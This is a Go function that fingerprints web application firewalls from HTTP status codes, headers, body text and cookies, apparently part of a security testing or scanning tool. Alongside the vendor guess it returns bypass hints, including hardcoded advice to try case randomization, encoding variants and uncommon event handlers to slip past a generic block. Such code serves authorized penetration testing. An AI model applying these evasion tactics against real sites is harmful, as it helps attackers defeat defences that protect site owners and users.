// =========================================================
// DetectWAF — analyze response headers + body + cookies
// =========================================================
func DetectWAF(statusCode int, headers map[string]string, body string) WAFInfo {
	info := WAFInfo{
		Detected:   false,
		Vendor:     "unknown",
		Confidence: 0,
		Evidence:   []string{},
		BypassHint: []string{},
	}

	if len(headers) == 0 && body == "" {
		return info
	}

	// Normalize
	headersLower := make(map[string]string)
	for k, v := range headers {
		headersLower[strings.ToLower(k)] = strings.ToLower(v)
	}
	bodyLower := strings.ToLower(body)

	bestScore := 0
	bestVendor := ""
	var bestEvidence []string
	var bestHints []string

	for _, sig := range wafDB {
		score := 0
		evidence := []string{}

		// 1. Header key match (strong signal — +40)
		for _, hk := range sig.HeaderKeys {
			if _, ok := headersLower[strings.ToLower(hk)]; ok {
				score += 40
				evidence = append(evidence, "header:"+hk)
			}
		}

		// 2. Header value match (+30)
		for _, hv := range sig.HeaderValues {
			for k, v := range headersLower {
				if strings.Contains(v, hv) {
					score += 30
					evidence = append(evidence, fmt.Sprintf("header:%s=%s", k, hv))
					break
				}
			}
		}

		// 3. Body signatures (+25 each, max 50)
		bodyHits := 0
		for _, bs := range sig.BodySignatures {
			if strings.Contains(bodyLower, bs) {
				score += 25
				bodyHits++
				evidence = append(evidence, "body:"+bs)
				if bodyHits >= 2 {
					break
				}
			}
		}

		// 4. Cookie names (+20)
		if cookieHeader, ok := headersLower["cookie"]; ok {
			for _, cn := range sig.CookieNames {
				if strings.Contains(cookieHeader, strings.ToLower(cn)) {
					score += 20
					evidence = append(evidence, "cookie:"+cn)
					break
				}
			}
		}

		// 5. Status-based generic signal (403/406/429)
		if statusCode == 403 || statusCode == 406 || statusCode == 429 {
			if score > 0 {
				score += 10
				evidence = append(evidence, fmt.Sprintf("status:%d", statusCode))
			}
		}

		if score > bestScore {
			bestScore = score
			bestVendor = sig.Vendor
			bestEvidence = evidence
			bestHints = sig.BypassHints
		}
	}

	// Threshold
	if bestScore >= 25 {
		info.Detected = true
		info.Vendor = bestVendor
		info.Evidence = bestEvidence
		info.BypassHint = bestHints
		if bestScore > 100 {
			bestScore = 100
		}
		info.Confidence = bestScore
	} else if statusCode == 403 || statusCode == 406 || statusCode == 429 {
		// Generic block detected but vendor unknown
		info.Detected = true
		info.Vendor = "unknown (generic block)"
		info.Confidence = 30
		info.Evidence = []string{fmt.Sprintf("status:%d", statusCode)}
		info.BypassHint = []string{
			"try case randomization",
			"try encoding variants",
			"try uncommon event handlers",
		}
	}

	return info
}

